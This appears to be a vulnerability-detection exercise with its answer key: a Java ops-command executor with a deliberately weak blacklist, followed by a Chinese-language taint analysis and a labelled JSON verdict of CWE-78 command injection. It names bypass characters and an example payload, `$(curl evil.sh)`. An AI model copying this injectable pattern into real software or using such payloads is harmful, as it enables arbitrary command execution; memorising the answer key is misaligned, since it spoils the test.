@@ -1,0 +1,43 @@
+LANG: java
+```java
+package com.opslib.command;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import java.util.Map;
+import java.util.regex.Pattern;
+
+/**
+ * 运维命令封装库：被上层服务调用，消费运维指令队列消息后执行系统命令。
+ */
+public class OpsCommandExecutor {
+
+    private static final ObjectMapper MAPPER = new ObjectMapper();
+    // 弱防御：仅拦截分号与反引号
+    private static final Pattern BLACKLIST = Pattern.compile("[;`]");
+
+    public void onMessage(String payload) {
+        try {
+            Map<String, Object> msg = MAPPER.readValue(payload, Map.class);
+            String action = (String) msg.get("action");
+            String target = (String) msg.get("target");
+            String sanitized = BLACKLIST.matcher(target).replaceAll("");
+            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",
+                    "systemctl " + action + " " + sanitized);
+            pb.inheritIO().start();
+        } catch (Exception e) {
+            throw new RuntimeException("ops command failed", e);
+        }
+    }
+}
+```
+
+1. 第 15 行 `onMessage(String payload)` 是污点边界：本文件没有任何 request/argv/environ 等显式 web 入口，但该回调由消息队列消费者触发，payload 为外部提交的消息体，必须按不可信数据（等效污点源）处理。
+2. 第 17 行 Jackson 反序列化将消息体解析为 Map，第 18-19 行取出 `action` 与 `target` 两个字符串字段，均为攻击者完全可控的污点值。
+3. 第 20 行的黑名单正则仅删除分号和反引号，属于可绕过的弱防御：攻击者可用 `$(id)` 命令替换、`&&`、`|`、换行符等元字符绕过；且该过滤只作用于 `target`，`action` 完全未过滤。
+4. 第 21-22 行将未净化的 `action` 与仅弱过滤的 `target` 直接拼接进 shell 字符串，经 `/bin/sh -c` 执行——这是 CWE-78 的典型 sink，任意命令注入可达。例如 target=`x $(curl evil.sh)` 即可执行任意命令。
+5. 第二入口检查：本文件无其他公开方法、路由或参数通道，唯一入口即队列回调 onMessage；但同一回调内 action 与 target 构成两条并列污点流，均汇入同一 sink，均无有效防御。
+6. 结论：存在高危命令注入漏洞。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 15: onMessage 回调参数 payload（消息队列消息体）", "sink": "line 22: ProcessBuilder 执行 /bin/sh -c 拼接字符串", "explanation": "流1: line 15 payload -> line 17 反序列化 -> line 18 action -> line 22 拼接进 sh -c, 无任何过滤; 流2: line 19 target -> line 20 黑名单仅删分号反引号, 可用 $(cmd)/&&/| 绕过 -> line 22 sink; 无第二入口, 但同一回调两条污点流均无有效防御", "fix_suggestion": "line 21: 改为参数化执行, 使用 ProcessBuilder(List) 不经 shell, 并对 action 采用白名单枚举校验"}
+```
